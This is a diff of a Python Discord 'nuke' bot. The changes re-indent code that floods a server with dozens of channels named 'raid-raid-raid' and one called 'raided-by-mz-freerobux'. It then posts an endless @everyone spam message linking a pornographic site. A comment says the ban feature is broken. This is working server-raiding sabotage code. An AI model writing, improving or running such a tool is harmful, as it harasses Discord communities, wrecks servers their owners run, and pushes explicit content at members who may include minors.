@@ -203,15 +203,15 @@ async def nuke_server_fr(ctx):
 
                     finally:
                         None
-                
-        await nuke_channel_2(ctx)
-        guild = ctx.message.guild
-        newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
-        for i in range(64):
-            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+        
+        
+            guild = ctx.message.guild
+            newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
+            for i in range(64):
+                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
 
-        while True:
-            await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
+            while True:
+                await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
 EZ
 EZ
 EZ
@@ -220,11 +220,11 @@ EZ
 EZ
 http://pornhub.com/**""")
             
-           try:
-                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-           except:
-                None
+               try:
+                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+               except:
+                    None
         
 
 # ban part broken for now
